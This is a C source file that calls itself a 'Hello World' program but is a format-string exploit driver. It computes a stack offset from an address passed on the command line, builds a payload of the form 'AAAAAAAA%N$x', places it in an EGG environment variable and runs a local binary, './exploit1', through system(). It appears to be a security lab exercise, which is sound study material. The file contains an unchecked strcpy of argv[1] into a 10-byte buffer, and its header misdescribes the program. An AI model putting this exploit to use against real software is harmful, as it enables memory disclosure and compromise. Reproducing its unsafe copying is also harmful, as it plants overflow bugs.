/*
 ============================================================================
 Name        : helloworld.c
 Author      : 
 Version     :
 Copyright   : Your copyright notice
 Description : Hello World in C, Ansi-style
 ============================================================================
 */

#include <stdio.h>
#include <stdlib.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#define DEFAULT_BUFFER_SIZE  256
static char attackingcode[] =
  "AAAAAAAA%";
static char attackingcode2[] =
  "$x";

/*
 * 将字符转换为数值
 * */
int c2i(char ch)
{
        if(isdigit(ch))
                return ch - 48;

        if( ch < 'A' || (ch > 'F' && ch < 'a') || ch > 'z' )
                return -1;
        if(isalpha(ch))
                return isupper(ch) ? ch - 55 : ch - 87;
        return -1;
}


int hex2dec(char *hex)
{
        int len;
        int num = 0;
        int temp;
        int bits;
        int i;

        len = strlen(hex);

        for (i=0, temp=0; i<len; i++, temp=0)
        {
                temp = c2i( *(hex + i) );
                bits = (len - i - 1) * 4;
                temp = temp << bits;
                num = num | temp;
        }
        return num;
}

void intToStr (int n,char str[]) {

        int i=0,j,len,m=n;
        char tmp;
        if(n<0) {
                str[0]='-';
                str[1]='\0';
                i++;
                n=-n;
        }

        do {
                str[i]=(n%10+0x30);
                n/=10;
                i++;
        }while(n!=0);
        str[i]='\0';

        len=i;

        if(m<0) {
                i=1;
        }else{
                i=0;
        }

        for(j=len-1;i<len/2;i++,j--) {
                tmp=str[i];
                str[i]=str[j];
                str[j]=tmp;
        }
}

int main(int argc, char *argv[])
{
		char c[10];
        char ch[10] = {0};
        char ch_base[10] = {0};
        strcpy(ch, argv[1]);
        strcpy(ch_base,"ffffc9d0");
        int hex_num = hex2dec(ch);
        int base_num = hex2dec(ch_base);
        int res = (hex_num-base_num)/8;
        if((hex_num-base_num)%8>0) res++;
        res+=8;
        intToStr(res, c);

        char *buff, *ptr;
		int bsize=DEFAULT_BUFFER_SIZE;
		if (!(buff = malloc(bsize))) {
						printf("Can't allocate memory.\n");
						exit(0);
		}
		int i;

		ptr=buff;
		for (i = 0; i < strlen(attackingcode); i++) *(ptr++) = attackingcode[i];
		int ii;
		for (ii=0; ii<strlen(c);i++,ii++) *(ptr++) = c[ii];
		for (ii=0; ii<strlen(attackingcode2);i++,ii++) *(ptr++) = attackingcode2[ii];
		buff[bsize - 1] = '\0';
		memcpy(buff,"EGG=",4);
		putenv(buff);
		system("./exploit1 $EGG");
        return 0;
}
